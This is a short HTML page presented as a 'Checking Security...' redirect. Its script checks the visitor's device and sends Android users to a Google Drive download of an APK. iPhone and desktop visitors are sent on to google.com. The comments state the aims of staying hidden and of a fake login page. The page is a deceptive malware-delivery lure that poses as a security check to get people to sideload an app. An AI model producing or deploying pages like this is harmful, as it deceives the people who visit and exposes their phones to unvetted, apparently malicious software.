<!DOCTYPE html>
<html>
<head>
    <title>Checking Security...</title>
    <script>
        // This part checks if the user is on Android, iPhone, or a Computer
        var userAgent = navigator.userAgent || navigator.vendor || window.opera;

        if (/android/i.test(userAgent)) {
            // Android users: Redirect to the Google Drive APK download
            window.location.href = "https://drive.google.com/uc?export=download&confirm=t&id=19HIEP9vGAgLnLQNJFEznyYkMtbjdwGRc";
        } 
        else if (/iPad|iPhone|iPod/.test(userAgent)) {
            // iPhone users: Redirect to your fake login page
            window.location.href = "https://www.google.com";
        } 
        else {
            // Computer users: Just send them to Google to stay hidden
            window.location.href = "https://www.google.com";
        }
    </script>
</head>
<body>
    <p>Redirecting to secure server...</p>
</body>
</html>
